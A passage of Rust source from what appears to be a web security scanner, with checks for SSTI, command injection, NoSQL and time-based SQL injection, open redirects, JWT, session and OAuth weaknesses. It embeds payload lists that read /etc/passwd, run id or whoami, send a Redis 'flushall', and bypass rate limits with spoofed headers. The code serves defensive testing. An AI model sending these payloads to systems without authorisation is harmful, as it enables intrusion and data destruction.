                if let Ok(response) = self.client.get(&test_url).send().await {
                    if let Ok(text) = response.text().await {
                        if !payload.signature.is_empty() && text.contains(&payload.signature) {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Critical,
                                title: format!("SSTI vulnerability detected: {}", payload.engine),
                                description: format!(
                                    "Server-Side Template Injection in parameter '{}'. Template engine: {}",
                                    param, payload.engine
                                ),
                                location: Some(test_url),
                                recommendation: Some("Disable dangerous template features, use templating with contextual auto-escaping, and avoid user input in template expressions.".to_string()),
                                cwe: Some("CWE-94".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });
                        }
                    }
                }
            }
        }

        Ok(report)
    }

    /// Command injection detection
    async fn check_command_injection(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Command injection payloads
        let cmd_payloads = vec![
            // Unix/Linux
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "; cat /etc/passwd",
            "`id`",
            "$(id)",
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "&& sleep 5",
            // Windows
            "| dir",
            "& type C:\\Windows\\win.ini",
            "| whoami",
            "& whoami",
        ];

        let test_params = vec!["file", "path", "name", "cmd", "exec", "command", "ip", "host"];

        for param in &test_params {
            for payload in &cmd_payloads {
                let encoded = urlencoding::encode(payload);
                let test_url = if url.contains('?') {
                    format!("{}&{}=test{}", url, param, encoded)
                } else {
                    format!("{}?{}=test{}", url, param, encoded)
                };

                let start = Instant::now();
                if let Ok(response) = self.client.get(&test_url).send().await {
                    let duration = start.elapsed();

                    if let Ok(text) = response.text().await {
                        // Check for command injection indicators
                        let text_lower = text.to_lowercase();
                        if text_lower.contains("uid=")
                            || text_lower.contains("gid=")
                            || text_lower.contains("root:")
                            || text_lower.contains("www-data")
                            || text_lower.contains("volume")
                            || text_lower.contains("directory of")
                            || text_lower.contains("[extensions]")
                        {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Critical,
                                title: "Command Injection vulnerability detected".to_string(),
                                description: format!("OS command injection in parameter '{}'. System command output detected in response.", param),
                                location: Some(test_url.clone()),
                                recommendation: Some("Use proper APIs instead of shell commands, validate and sanitize all input, use parameterized execution.".to_string()),
                                cwe: Some("CWE-78".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });
                        }
                    }

                    // Time-based detection for sleep commands
                    if payload.contains("sleep") && duration.as_secs() >= 4 {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::Critical,
                            title: "Command Injection vulnerability detected (time-based)".to_string(),
                            description: format!("OS command injection in parameter '{}'. Response delay indicates command execution.", param),
                            location: Some(test_url),
                            recommendation: Some("Use proper APIs instead of shell commands. Avoid passing user input to system shells.".to_string()),
                            cwe: Some("CWE-78".to_string()),
                            owasp: Some("A03:2021 - Injection".to_string()),
                        });
                    }
                }
            }
        }

        Ok(report)
    }

    /// Rate limit detection
    async fn check_rate_limit(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        let mut status_counts: HashMap<u16, usize> = HashMap::new();

        // Send multiple requests to detect rate limiting
        let num_requests = 20;
        let mut rate_limit_detected = false;

        for _i in 0..num_requests {
            match self.client.get(url).send().await {
                Ok(response) => {
                    let status = response.status();
                    *status_counts.entry(status.as_u16()).or_insert(0) += 1;

                    // Check for rate limit headers
                    let _rate_limit_headers: Vec<String> = response
                        .headers()
                        .iter()
                        .filter(|(k, _)| {
                            let name = k.as_str();
                            name.contains("rate-limit")
                                || name.contains("X-RateLimit")
                                || name.contains("ratelimit")
                        })
                        .map(|(k, v)| format!("{}: {:?}", k, v))
                        .collect();

                    // Check for rate limit status codes
                    if status.as_u16() == 429 {
                        rate_limit_detected = true;
                    }
                }
                Err(_) => {}
            }

            // Small delay between requests
            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        // Analyze results
        if rate_limit_detected {
            report.add_finding(Vuln {
                severity: VulnSeverity::Info,
                title: "Rate limiting detected".to_string(),
                description: "Application implements rate limiting (HTTP 429 responses)".to_string(),
                location: Some(url.to_string()),
                recommendation: Some("Rate limiting is properly configured. Consider adjusting thresholds based on your needs.".to_string()),
                cwe: Some("CWE-770".to_string()),
                owasp: Some("A04:2021 - Insecure Design".to_string()),
            });
        } else {
            // Check if we got consistent 200 OK (no rate limiting)
            let ok_count = status_counts.get(&200).unwrap_or(&0);
            if *ok_count >= num_requests - 2 {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Medium,
                    title: "No rate limiting detected".to_string(),
                    description: format!(
                        "Sent {} requests without rate limiting. Application may be vulnerable to abuse/DoS.",
                        num_requests
                    ),
                    location: Some(url.to_string()),
                    recommendation: Some("Implement rate limiting to prevent abuse and DoS attacks. Consider headers: X-RateLimit-* and status code 429.".to_string()),
                    cwe: Some("CWE-770".to_string()),
                    owasp: Some("A04:2021 - Insecure Design".to_string()),
                });
            }
        }

        // Check rate limit bypass techniques
        if !rate_limit_detected {
            report.merge(self.check_rate_limit_bypass(url).await?);
        }

        Ok(report)
    }

    async fn check_rate_limit_bypass(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Bypass techniques
        let bypass_methods = vec![
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"),
            ("X-Remote-Addr", "127.0.0.1"),
        ];

        for (header, value) in bypass_methods {
            let mut success_count = 0;
            let requests = 10;

            for _ in 0..requests {
                match self.client.get(url).header(header, value).send().await {
                    Ok(response) if response.status().is_success() => {
                        success_count += 1;
                    }
                    _ => {}
                }
            }

            if success_count >= requests - 1 {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Medium,
                    title: format!("Rate limit bypass via {}", header),
                    description: format!(
                        "Rate limiting can be bypassed by setting the {} header. This suggests IP-based rate limiting that trusts client headers.",
                        header
                    ),
                    location: Some(url.to_string()),
                    recommendation: Some("Implement proper rate limiting based on the actual connection IP, not client-settable headers. Use reverse proxy rate limiting.".to_string()),
                    cwe: Some("CWE-770".to_string()),
                    owasp: Some("A04:2021 - Insecure Design".to_string()),
                });
                break;
            }
        }

        Ok(report)
    }

    /// NoSQL Injection detection (MongoDB, CouchDB, Redis, etc.)
    async fn check_nosql_injection(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // NoSQL injection payloads for different databases
        let nosql_payloads = vec![
            // MongoDB
            ("' || '1'=='1", "MongoDB (OR operator)"),
            ("'[$ne]=1", "MongoDB (not equal)"),
            ("', $or: [ {a:1}, {a:2} ], '", "MongoDB (operator injection)"),
            ("{$where: 'this.a == this.b'}", "MongoDB ($where)"),
            // Redis
            ("\\r\\nSET test 1", "Redis (CRLF injection)"),
            ("*1\r\n$4\r\nINFO\r\n$8\r\nflushall\r\n$0\r\n", "Redis (RESP protocol)"),
            // CouchDB
            ("', '_id: { $gt: null }, '", "CouchDB"),
            // General JSON injection
            (r#"{"user": {"$ne": null}}"#, "JSON NoSQL"),
            (r#"{"$regex": ".*"}"#, "NoSQL regex injection"),
        ];

        let test_params = vec!["id", "user", "username", "search", "filter", "query", "data"];

        // Try to inject into query parameters
        let base_url = url.parse::<url::Url>();
        let base_url = match base_url {
            Ok(u) => u,
            Err(_) => return Ok(report),
        };

        for param in test_params {
            for (payload, db_type) in &nosql_payloads {
                let mut test_url = base_url.clone();
                test_url.query_pairs_mut().append_pair(param, payload);

                match self.client.get(test_url.as_str()).send().await {
                    Ok(response) => {
                        let status = response.status();
                        let text = response.text().await.unwrap_or_default();

                        // Check for NoSQL error messages
                        let error_patterns = vec![
                            "MongoError",
                            "MongoServerError",
                            "couchdb",
                            "redis",
                            "E11000",
                            "Cast to ObjectId failed",
                            "SyntaxError",
                            "malformed",
                            "unexpected token",
                        ];

                        for pattern in &error_patterns {
                            if text.to_lowercase().contains(&pattern.to_lowercase()) {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::High,
                                    title: format!("NoSQL Injection detected ({})", db_type),
                                    description: format!("NoSQL injection vulnerability in parameter '{}'. Database error message revealed: {}", param, pattern),
                                    location: Some(test_url.to_string()),
                                    recommendation: Some("Use input validation and proper query builders. Avoid direct user input in database queries.".to_string()),
                                    cwe: Some("CWE-943".to_string()),
                                    owasp: Some("A03:2021 - Injection".to_string()),
                                });
                                break;
                            }
                        }

                        // Also check for successful injections (different response sizes)
                        if status.is_success() && text.len() > 100 {
                            // Compare with normal request
                            let mut normal_url = base_url.clone();
                            normal_url.query_pairs_mut().append_pair(param, "test");

                            if let Ok(normal_resp) = self.client.get(normal_url.as_str()).send().await {
                                let normal_text = normal_resp.text().await.unwrap_or_default();
                                // Significant difference in response might indicate injection
                                let size_diff = (text.len() as i64 - normal_text.len() as i64).abs();
                                if size_diff > 200 {
                                    report.add_finding(Vuln {
                                        severity: VulnSeverity::Medium,
                                        title: format!("Potential NoSQL Injection ({})", db_type),
                                        description: format!("Response size difference ({} bytes) suggests possible injection in parameter '{}'", size_diff, param),
                                        location: Some(test_url.to_string()),
                                        recommendation: Some("Verify if the payload affects query logic. Use parameterized queries.".to_string()),
                                        cwe: Some("CWE-943".to_string()),
                                        owasp: Some("A03:2021 - Injection".to_string()),
                                    });
                                }
                            }
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        Ok(report)
    }

    /// CSRF Token analysis
    async fn check_csrf_protection(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // First, fetch the page to look for forms
        match self.client.get(url).send().await {
            Ok(response) => {
                // Clone headers before consuming response body
                let headers = response.headers().clone();
                let text = response.text().await.unwrap_or_default();

                // Check for CSRF tokens in forms
                let has_csrf_token = text.contains("csrf_token")
                    || text.contains("csrfmiddlewaretoken")
                    || text.contains("_token")
                    || text.contains("authenticity_token")
                    || text.contains("__RequestVerificationToken");

                let has_form = text.contains("<form")
                    || text.contains("action=")
                    || text.contains("method=\"post\"");

                // Check for SameSite cookie attribute
                let has_samesite = headers
                    .get_all("set-cookie")
                    .iter()
                    .any(|c| c.to_str().unwrap_or("").to_lowercase().contains("samesite="));

                // Check if form submission requires token
                if has_form && !has_csrf_token {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Medium,
                        title: "Missing CSRF Token in Form".to_string(),
                        description: "Form detected but no CSRF token found. This could allow Cross-Site Request Forgery attacks.".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Add CSRF tokens to all forms that perform state-changing operations. Use framework-provided CSRF protection.".to_string()),
                        cwe: Some("CWE-352".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }

                // Check SameSite cookie attribute
                if has_form && !has_samesite {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Low,
                        title: "Cookies Missing SameSite Attribute".to_string(),
                        description: "Session cookies lack SameSite attribute, increasing CSRF risk.".to_string(),
                        location: Some(url.to_string()),
                        recommendation: Some("Set SameSite=Strict or SameSite=Lax on session cookies.".to_string()),
                        cwe: Some("CWE-352".to_string()),
                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                    });
                }
            }
            Err(_) => {}
        }

        Ok(report)
    }

    /// Clickjacking detection (X-Frame-Options bypass)
    async fn check_clickjacking(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Check for X-Frame-Options header
        let x_frame_header = self
            .client
            .get(url)
            .send()
            .await
            .ok();

        if let Some(response) = x_frame_header {
            if let Some(header) = response.headers().get("x-frame-options") {
                if let Ok(header_str) = header.to_str() {
                    let header_lower = header_str.to_lowercase();

                    // Check for weak configurations
                    if header_lower.contains("allow-from") {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::Low,
                            title: "X-Frame-Options Uses Allow-From".to_string(),
                            description: "The 'allow-from' directive is deprecated and not supported in modern browsers.".to_string(),
                            location: Some(url.to_string()),
                            recommendation: Some("Use Content-Security-Policy with 'frame-ancestors' directive instead.".to_string()),
                            cwe: Some("CWE-1021".to_string()),
                            owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                        });
                    }

                    // Check for SAMEORIGIN which is good
                    if !header_lower.contains("deny") && !header_lower.contains("sameorigin") {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::Medium,
                            title: "Weak X-Frame-Options Configuration".to_string(),
                            description: format!("X-Frame-Options set to '{}', which may allow clickjacking.", header_str),
                            location: Some(url.to_string()),
                            recommendation: Some("Set X-Frame-Options to 'DENY' or 'SAMEORIGIN'.".to_string()),
                            cwe: Some("CWE-1021".to_string()),
                            owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                        });
                    }
                }
            } else {
                // No X-Frame-Options header found
                report.add_finding(Vuln {
                    severity: VulnSeverity::Medium,
                    title: "Missing X-Frame-Options Header".to_string(),
                    description: "Application may be vulnerable to clickjacking attacks via frame embedding.".to_string(),
                    location: Some(url.to_string()),
                    recommendation: Some("Add 'X-Frame-Options: DENY' or 'SAMEORIGIN' header.".to_string()),
                    cwe: Some("CWE-1021".to_string()),
                    owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                });
            }
        }

        Ok(report)
    }

    /// Open redirect detection
    async fn check_open_redirect(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Open redirect payloads
        let redirect_payloads = vec![
            ("//evil.com", "Protocol-relative URL"),
            ("/\\/evil.com", "Encoded protocol-relative"),
            ("https://evil.com", "Absolute external URL"),
            ("\\evil.com", "Backslash bypass"),
            ("http://credential.thehost.com:80/", "Credential harvesting"),
            ("//credential.thehost.com:80/", "Credential harvesting (protocol-relative)"),
            ("/%2F%2Fevil.com", "URL encoded slash"),
            ("/%5C%5Cevil.com", "URL encoded backslash"),
        ];

        // Common redirect parameters
        let redirect_params = vec![
            "redirect",
            "url",
            "return",
            "returnTo",
            "return_url",
            "redirect_url",
            "link",
            "goto",
            "next",
            "target",
            "dest",
            "destination",
            "file",
            "path",
            "continue",
            "callback",
            "redir",
        ];

        let base_url = match url.parse::<url::Url>() {
            Ok(u) => u,
            Err(_) => return Ok(report),
        };

        for param in &redirect_params {
            for (payload, bypass_type) in &redirect_payloads {
                let mut test_url = base_url.clone();
                test_url.query_pairs_mut().append_pair(param, payload);

                match self.client.get(test_url.as_str()).send().await {
                    Ok(response) => {
                        // Check if we got a redirect
                        if let Some(final_url) = response.url().clone().into_string().split('?').next() {
                            // Check if redirected to external domain
                            if final_url.contains("evil.com") || final_url.contains("credential.thehost.com") {
                                report.add_finding(Vuln {
                                    severity: VulnSeverity::Medium,
                                    title: format!("Open Redirect Vulnerability ({})", bypass_type),
                                    description: format!("Parameter '{}' accepts external URLs, allowing open redirect attacks.", param),
                                    location: Some(format!("{}?{}={}", url, param, payload)),
                                    recommendation: Some("Use a whitelist of allowed redirect URLs. Implement relative URL validation.".to_string()),
                                    cwe: Some("CWE-601".to_string()),
                                    owasp: Some("A01:2021 - Broken Access Control".to_string()),
                                });
                                break;
                            }
                        }

                        // Also check via Location header
                        if let Some(location) = response.headers().get("location") {
                            if let Ok(loc_str) = location.to_str() {
                                if loc_str.contains("evil.com") || loc_str.contains("credential") {
                                    report.add_finding(Vuln {
                                        severity: VulnSeverity::High,
                                        title: format!("Open Redirect via Location Header ({})", bypass_type),
                                        description: format!("Parameter '{}' triggers redirect to external URL.", param),
                                        location: Some(format!("{}?{}={}", url, param, payload)),
                                        recommendation: Some("Validate redirect URLs against a whitelist. Use URL encoding properly.".to_string()),
                                        cwe: Some("CWE-601".to_string()),
                                        owasp: Some("A01:2021 - Broken Access Control".to_string()),
                                    });
                                    break;
                                }
                            }
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        Ok(report)
    }

    /// Time-based SQL Injection detection
    async fn check_sqli_time_based(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Time-based payloads
        let time_payloads = vec![
            ("' AND SLEEP(5)--", "MySQL SLEEP"),
            ("' WAITFOR DELAY '00:00:05'--", "SQL Server WAITFOR"),
            ("' OR 1=1; DBMS_LOCK.SLEEP(5)--", "Oracle SLEEP"),
            ("' OR 1=1; SELECT PG_SLEEP(5)--", "PostgreSQL PG_SLEEP"),
            ("' OR 1=1; SELECT COUNT(*) FROM GENERATE_SERIES(1,3000000)--", "PostgreSQL enumeration"),
            ("'; SELECT SLEEP(5)--", "Generic SLEEP"),
            ("' AND BENCHMARK(50000000,MD5(1))--", "MySQL BENCHMARK"),
        ];

        let base_url = match url.parse::<url::Url>() {
            Ok(u) => u,
            Err(_) => return Ok(report),
        };

        // First, get baseline response time
        let baseline_start = Instant::now();
        let _ = self.client.get(base_url.clone()).send().await;
        let baseline_time = baseline_start.elapsed().as_millis();

        let test_params = vec!["id", "user", "search", "category"];

        for param in test_params {
            for (payload, db_type) in &time_payloads {
                let mut test_url = base_url.clone();
                test_url.query_pairs_mut().append_pair(param, payload);

                let test_start = Instant::now();
                match self.client.get(test_url.as_str()).send().await {
                    Ok(_) => {
                        let test_time = test_start.elapsed().as_millis();

                        // If response took significantly longer than baseline
                        if test_time > baseline_time + 3000 {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: format!("Time-Based SQL Injection ({})", db_type),
                                description: format!(
                                    "Parameter '{}' vulnerable to time-based SQL injection. Response took {}ms vs {}ms baseline ({}ms delay).",
                                    param, test_time, baseline_time, test_time - baseline_time
                                ),
                                location: Some(format!("{}?{}=[injected]", url, param)),
                                recommendation: Some("Use parameterized queries. Disable error messages in production.".to_string()),
                                cwe: Some("CWE-89".to_string()),
                                owasp: Some("A03:2021 - Injection".to_string()),
                            });
                            break;
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        Ok(report)
    }

    /// JWT Token analysis and manipulation detection
    async fn check_jwt_security(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Try to find JWT tokens in response
        match self.client.get(url).send().await {
            Ok(response) => {
                let text = response.text().await.unwrap_or_default();

                // JWT regex pattern (header.payload.signature)
                let jwt_re = Regex::new(r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+").unwrap();

                if let Some(jwt_token) = jwt_re.find(&text) {
                    let token = jwt_token.as_str();

                    // Analyze JWT structure
                    let parts: Vec<&str> = token.split('.').collect();

                    if parts.len() == 3 {
                        let header = parts[0];
                        let payload = parts[1];

                        // Decode header (base64url)
                        if let Ok(header_decoded) = Self::base64url_decode(header) {
                            if let Ok(header_json) = serde_json::from_str::<serde_json::Value>(&header_decoded) {
                                // Check for weak algorithms
                                if let Some(alg) = header_json.get("alg") {
                                    let alg_str = alg.as_str().unwrap_or("");

                                    match alg_str {
                                        "none" => {
                                            report.add_finding(Vuln {
                                                severity: VulnSeverity::Critical,
                                                title: "JWT with 'none' Algorithm Detected".to_string(),
                                                description: "JWT token uses 'none' algorithm, allowing signature bypass.".to_string(),
                                                location: Some(url.to_string()),
                                                recommendation: Some("Disable 'none' algorithm. Use strong algorithms like RS256 or ES256.".to_string()),
                                                cwe: Some("CWE-347".to_string()),
                                                owasp: Some("A02:2021 - Cryptographic Failures".to_string()),
                                            });
                                        }
                                        "HS256" | "HS384" | "HS512" => {
                                            report.add_finding(Vuln {
                                                severity: VulnSeverity::Medium,
                                                title: format!("JWT with HMAC Algorithm ({})", alg_str),
                                                description: format!("JWT uses HMAC algorithm ({}). Ensure secret key is sufficiently strong (256+ bits).", alg_str),
                                                location: Some(url.to_string()),
                                                recommendation: Some("Consider using asymmetric algorithms (RS256, ES256) for better security.".to_string()),
                                                cwe: Some("CWE-327".to_string()),
                                                owasp: Some("A02:2021 - Cryptographic Failures".to_string()),
                                            });
                                        }
                                        _ => {}
                                    }
                                }
                            }
                        }

                        // Decode payload
                        if let Ok(payload_decoded) = Self::base64url_decode(payload) {
                            if let Ok(payload_json) = serde_json::from_str::<serde_json::Value>(&payload_decoded) {
                                // Check for sensitive data in JWT
                                let sensitive_fields = vec![
                                    "password", "secret", "api_key", "token", "credit_card",
                                    "ssn", "social_security", "pin", "private_key",
                                ];

                                for field in &sensitive_fields {
                                    if payload_json.as_object().map_or(false, |obj| {
                                        obj.keys().any(|k| k.to_lowercase().contains(field))
                                    }) {
                                        report.add_finding(Vuln {
                                            severity: VulnSeverity::High,
                                            title: format!("Sensitive Data in JWT Payload ({})", field),
                                            description: format!("JWT token contains potentially sensitive field: {}", field),
                                            location: Some(url.to_string()),
                                            recommendation: Some("Avoid storing sensitive data in JWT tokens. Use references/IDs instead.".to_string()),
                                            cwe: Some("CWE-312".to_string()),
                                            owasp: Some("A02:2021 - Cryptographic Failures".to_string()),
                                        });
                                    }
                                }

                                // Check token expiration
                                if let Some(exp) = payload_json.get("exp") {
                                    if let Some(exp_num) = exp.as_i64() {
                                        let current_time = std::time::SystemTime::now()
                                            .duration_since(std::time::UNIX_EPOCH)
                                            .unwrap_or_default()
                                            .as_secs() as i64;

                                        // Check if token expires far in the future (> 24 hours)
                                        if exp_num - current_time > 86400 {
                                            report.add_finding(Vuln {
                                                severity: VulnSeverity::Medium,
                                                title: "Long-Lived JWT Token Detected".to_string(),
                                                description: format!("JWT token has expiration more than 24 hours in the future (exp: {})", exp_num),
                                                location: Some(url.to_string()),
                                                recommendation: Some("Use shorter-lived tokens (15-30 minutes). Implement refresh token mechanism.".to_string()),
                                                cwe: Some("CWE-613".to_string()),
                                                owasp: Some("A07:2021 - Identification and Authentication Failures".to_string()),
                                            });
                                        }
                                    }
                                } else {
                                    report.add_finding(Vuln {
                                        severity: VulnSeverity::Medium,
                                        title: "JWT Token Without Expiration".to_string(),
                                        description: "JWT token lacks 'exp' claim, meaning it never expires.".to_string(),
                                        location: Some(url.to_string()),
                                        recommendation: Some("Always include 'exp' (expiration) claim in JWT tokens.".to_string()),
                                        cwe: Some("CWE-613".to_string()),
                                        owasp: Some("A07:2021 - Identification and Authentication Failures".to_string()),
                                    });
                                }
                            }
                        }

                        report.add_finding(Vuln {
                            severity: VulnSeverity::Info,
                            title: "JWT Token Detected".to_string(),
                            description: "JWT token found in response. Review algorithm, expiration, and payload content.".to_string(),
                            location: Some(url.to_string()),
                            recommendation: Some("Ensure JWT uses strong algorithms, has expiration, and contains minimal data.".to_string()),
                            cwe: Some("CWE-347".to_string()),
                            owasp: Some("A07:2021 - Identification and Authentication Failures".to_string()),
                        });
                    }
                }
            }
            Err(_) => {}
        }

        Ok(report)
    }

    /// Session fixation detection
    async fn check_session_fixation(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // First request - check if session cookie is set
        let response1 = self.client.get(url).send().await;
        let cookies1: Vec<String> = match response1 {
            Ok(resp) => {
                resp.headers()
                    .get_all("set-cookie")
                    .iter()
                    .filter_map(|c| c.to_str().ok())
                    .map(|c| c.to_string())
                    .collect()
            }
            Err(_) => return Ok(report),
        };

        // Extract session cookie names
        let session_cookies: Vec<String> = cookies1
            .iter()
            .filter(|c| {
                c.to_lowercase().contains("session")
                    || c.to_lowercase().contains("jsessionid")
                    || c.to_lowercase().contains("phpsessid")
                    || c.to_lowercase().contains("aspsessionid")
                    || c.to_lowercase().contains("sid")
            })
            .map(|c| {
                c.split('=')
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string()
            })
            .collect();

        // Second request - check if same session cookie is reused
        let response2 = self.client.get(url).send().await;
        let cookies2: Vec<String> = match response2 {
            Ok(resp) => {
                resp.headers()
                    .get_all("set-cookie")
                    .iter()
                    .filter_map(|c| c.to_str().ok())
                    .map(|c| c.to_string())
                    .collect()
            }
            Err(_) => return Ok(report),
        };

        // Check if session cookies are being reissued
        for session_cookie in &session_cookies {
            let cookie1_value = cookies1
                .iter()
                .find(|c| c.starts_with(&format!("{}=", session_cookie)))
                .and_then(|c| c.split('=').nth(1))
                .map(|v| v.split(';').next().unwrap_or(v).to_string());

            let cookie2_value = cookies2
                .iter()
                .find(|c| c.starts_with(&format!("{}=", session_cookie)))
                .and_then(|c| c.split('=').nth(1))
                .map(|v| v.split(';').next().unwrap_or(v).to_string());

            // If session cookie exists and doesn't change, potential session fixation
            if let (Some(v1), Some(v2)) = (cookie1_value, cookie2_value) {
                if v1 == v2 && !v1.is_empty() {
                    report.add_finding(Vuln {
                        severity: VulnSeverity::Medium,
                        title: "Potential Session Fixation".to_string(),
                        description: format!(
                            "Session cookie '{}' is not being regenerated after requests. The same value persists: {}",
                            session_cookie, v1
                        ),
                        location: Some(url.to_string()),
                        recommendation: Some("Regenerate session ID after authentication. Use session_regenerate_id() or equivalent.".to_string()),
                        cwe: Some("CWE-384".to_string()),
                        owasp: Some("A07:2021 - Identification and Authentication Failures".to_string()),
                    });
                }
            }
        }

        // Check for secure cookie attributes
        for cookie in &cookies1 {
            let cookie_lower = cookie.to_lowercase();

            // Check for HttpOnly
            if cookie_lower.contains("session") && !cookie_lower.contains("httponly") {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Low,
                    title: "Session Cookie Missing HttpOnly Flag".to_string(),
                    description: "Session cookie lacks HttpOnly attribute, making it accessible to JavaScript.".to_string(),
                    location: Some(url.to_string()),
                    recommendation: Some("Set HttpOnly flag on session cookies to prevent XSS access.".to_string()),
                    cwe: Some("CWE-1004".to_string()),
                    owasp: Some("A05:2021 - Security Misconfiguration".to_string()),
                });
            }

            // Check for Secure flag
            if cookie_lower.contains("session") && !cookie_lower.contains("secure") {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Medium,
                    title: "Session Cookie Missing Secure Flag".to_string(),
                    description: "Session cookie lacks Secure attribute, allowing transmission over HTTP.".to_string(),
                    location: Some(url.to_string()),
                    recommendation: Some("Set Secure flag on session cookies to ensure HTTPS-only transmission.".to_string()),
                    cwe: Some("CWE-614".to_string()),
                    owasp: Some("A02:2021 - Cryptographic Failures".to_string()),
                });
            }

            // Check for SameSite
            if cookie_lower.contains("session") && !cookie_lower.contains("samesite") {
                report.add_finding(Vuln {
                    severity: VulnSeverity::Low,
                    title: "Session Cookie Missing SameSite Attribute".to_string(),
                    description: "Session cookie lacks SameSite attribute, increasing CSRF risk.".to_string(),
                    location: Some(url.to_string()),
                    recommendation: Some("Set SameSite=Strict or SameSite=Lax on session cookies.".to_string()),
                    cwe: Some("CWE-352".to_string()),
                    owasp: Some("A01:2021 - Broken Access Control".to_string()),
                });
            }
        }

        Ok(report)
    }

    /// OAuth 2.0 security testing
    async fn check_oauth_security(&self, url: &str) -> Result<ScanReport> {
        let mut report = ScanReport::new(Target::Url(url.to_string()));

        // Common OAuth endpoints
        let oauth_paths = vec![
            "/oauth/authorize",
            "/oauth/token",
            "/oauth",
            "/authorize",
            "/token",
            "/api/oauth/authorize",
            "/api/oauth/token",
            "/auth",
            "/authentication",
        ];

        let base_url = match url.parse::<url::Url>() {
            Ok(u) => u,
            Err(_) => return Ok(report),
        };

        for path in oauth_paths {
            let oauth_url = format!("{}{}", base_url.to_string().trim_end_matches('/'), path);

            match self.client.get(&oauth_url).send().await {
                Ok(response) => {
                    let status = response.status();
                    let text = response.text().await.unwrap_or_default();

                    // Check for OAuth-related content
                    let oauth_indicators = vec![
                        "access_token",
                        "authorization_code",
                        "oauth",
                        "client_id",
                        "redirect_uri",
                        "response_type",
                        "scope",
                    ];

                    let has_oauth = oauth_indicators
                        .iter()
                        .any(|indicator| text.to_lowercase().contains(indicator));

                    if has_oauth || !status.is_server_error() {
                        // Check for PKCE (Proof Key for Code Exchange)
                        if !text.to_lowercase().contains("code_challenge")
                            && !text.to_lowercase().contains("pkce")
                        {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Medium,
                                title: "OAuth Flow May Lack PKCE".to_string(),
                                description: "OAuth authorization endpoint may not require PKCE, vulnerable to authorization code interception.".to_string(),
                                location: Some(oauth_url.clone()),
                                recommendation: Some("Implement PKCE (RFC 7636) for all public clients and mobile apps.".to_string()),
                                cwe: Some("CWE-927".to_string()),
                                owasp: Some("A01:2021 - Broken Access Control".to_string()),
                            });
                        }

                        // Check for state parameter (CSRF protection)
                        if !text.to_lowercase().contains("state") {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::High,
                                title: "OAuth Flow Missing State Parameter".to_string(),
                                description: "OAuth authorization flow may not use state parameter, vulnerable to CSRF.".to_string(),
                                location: Some(oauth_url.clone()),
                                recommendation: Some("Always include and validate 'state' parameter in OAuth flows.".to_string()),
                                cwe: Some("CWE-352".to_string()),
                                owasp: Some("A01:2021 - Broken Access Control".to_string()),
                            });
                        }

                        // Check for implicit grant (deprecated)
                        if text.contains("response_type=token") || text.contains("implicit") {
                            report.add_finding(Vuln {
                                severity: VulnSeverity::Medium,
                                title: "OAuth Implicit Grant Detected".to_string(),
                                description: "Implicit grant flow is deprecated and insecure. Access token is exposed in URL fragment.".to_string(),
                                location: Some(oauth_url.clone()),
                                recommendation: Some("Use Authorization Code flow with PKCE instead of Implicit grant.".to_string()),
                                cwe: Some("CWE-927".to_string()),
                                owasp: Some("A02:2021 - Cryptographic Failures".to_string()),
                            });
                        }
                    }
                }
                Err(_) => continue,
            }
        }

        // Check for token leakage in URL
        match self.client.get(url).send().await {
            Ok(response) => {
                if let Some(final_url) = response.url().clone().into_string().split('?').next() {
                    if final_url.contains("access_token=")
                        || final_url.contains("bearer_token=")
                        || final_url.contains("token=")
                    {
                        report.add_finding(Vuln {
                            severity: VulnSeverity::High,
                            title: "OAuth Token in URL Fragment".to_string(),
                            description: "OAuth access token appears in URL, which may be logged or cached.".to_string(),
                            location: Some(final_url.to_string()),
                            recommendation: Some("Use Authorization Code flow with tokens in POST body, not URL.".to_string()),
